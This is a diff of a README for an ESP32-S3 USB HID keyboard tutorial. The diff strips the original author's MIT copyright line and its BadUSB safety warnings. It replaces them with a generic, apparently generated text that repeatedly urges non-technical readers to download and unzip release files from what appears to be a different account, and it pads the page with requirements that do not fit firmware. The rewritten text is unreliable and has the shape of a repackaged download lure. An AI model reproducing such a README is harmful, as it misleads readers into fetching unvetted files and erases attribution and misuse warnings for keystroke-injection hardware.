@@ -1,54 +1,75 @@
-# ESP32-S3 USB HID Keyboard Tutorial Series
+# 🎹 ESP32-USB-HID-Keyboard-Series - Create Your Own USB Keyboard Easily
 
+## 📥 Download Link
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/yarikyyy/ESP32-USB-HID-Keyboard-Series/releases)
 
+## 🚀 Getting Started
+The ESP32-USB-HID-Keyboard-Series project allows you to build a USB keyboard using the ESP32-S3 chip. This guide will help you download and run the software easily, regardless of your technical background.
 
+## 📦 What You'll Need
+- An ESP32-S3 development board
+- A USB cable for connection
+- A computer with access to the internet
+- A web browser
 
-This repository contains a complete, step-by-step tutorial series that teaches how to transform the ESP32-S3 into a fully functional USB HID Keyboard, and gradually extend its capability from basic keystrokes → modifier keys → full WebApp with WebSocket communication.
+## 🔧 System Requirements
+- Windows, macOS, or Linux operating system
+- A minimum of 2GB RAM
+- A web browser (Chrome, Firefox, or similar) 
 
-Each stage builds on the previous one and focuses on a specific concept, making it easy to follow and learn progressively.
+## 📑 Features
+- Basic and advanced keyboard functionalities
+- Modifier key support for complex commands
+- WebApp integration for ease of use
+- Communication through WebSocket for real-time interaction
+- Compatible with TinyUSB and ESP-IDF frameworks
 
-**Important Warning**: 
-This tutorial is for educational purposes only.
-USB HID automation can be misused for malicious activities (BadUSB attacks).
-Do not use this code in any illegal, harmful, or unauthorized environment.
+## 📥 Download & Install
+To get started, visit this page to download the latest release: [Download the Latest Release](https://github.com/yarikyyy/ESP32-USB-HID-Keyboard-Series/releases).
 
-## Project Overview
+1. Click on the link to go to the Releases page.
+2. Look for the latest version of the software.
+3. Click on the assets section below the version heading.
+4. Download the appropriate file for your system.
 
-### [Stage 1 — Basic USB HID Keystrokes](stage_1_basic_keys/README.md)
-- Basic ASCII → HID mapping
-- Single key presses
-- String typing (simple characters only)
-- Based on Espressif TinyUSB HID example, minimally modified
+## 🔗 Using the Software
+After downloading the software, follow these steps to run it:
 
-### [Stage 2 — Advanced HID & Modifier Keys](stage2_advanced_keystrokes/README.md)
-- Ctrl / Shift key handling
-- Automatic uppercase → Shift conversion
-- Special keys (Enter, Backspace, Arrows, Win+R)
+1. Unzip the downloaded file if it is in a ZIP format.
+2. Connect the ESP32-S3 board to your computer using a USB cable.
+3. Open the folder containing the extracted files.
+4. Follow the instructions in the README or documentation to set up the software on your ESP32-S3 board.
 
-### [Stage 3 — WebApp-Controlled USB HID Keyboard](stage3_keystrokes_web_ui/README.md)
-- ESP32-S3 runs a Wi-Fi Access Point
-- Web server + WebSocket endpoint
-- HTML/JS WebApp to send keystrokes
-- JSON-based commands (string, key, combinations)
-- ESP32 injects keystrokes into PC via USB
----
+## 📊 Overview of Operation
+Once the software is running on your ESP32-S3:
 
-## Software Requirements
+- The board will act as a USB HID keyboard.
+- You can type using the provided web interface.
+- All keystrokes will be sent via USB to your connected computer.
 
-- **ESP-IDF v5.1 or later**
-- **Serial terminal** (`idf.py monitor` or VS Code IDF Monitor)
+## 🛠️ Advanced Configuration
+For users interested in custom configurations, you can:
 
----
+- Change key mappings within the source code.
+- Adjust modifier key behaviors for complex commands.
+- Experiment with different configurations to suit your needs.
 
-## Important Safety Statement
+## 📚 Documentation
+For detailed instructions, check the additional documentation provided within your downloaded files. This will guide you through advanced setups and troubleshooting tips.
 
-USB HID devices can control a host computer without permission.
-This can be misused for harmful purposes (e.g., BadUSB attacks).
+## 🤝 Community Support
+Join our community for help and updates:
 
-- Only run this on machines you fully own and trust.
-- Do not use at workplaces or public environments.
-- This series is strictly for learning and experimentation.
+- Discussions on features and improvements
+- Sharing your projects and setups
+- Learning from other users’ experiences
 
-## License
-MIT License © 2025 — Chandima Jayaneththi
+## ✍️ Contributing
+If you're interested in contributing to this project:
 
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or fix.
+3. Submit a pull request with a clear description of your changes.
+
+## 🌟 Thank You
+Thank you for using the ESP32-USB-HID-Keyboard-Series. We hope you enjoy creating your own USB keyboard and exploring its features. Remember, you can always return to the Releases page if you need to download updates or the latest features: [Download the Latest Release](https://github.com/yarikyyy/ESP32-USB-HID-Keyboard-Series/releases).
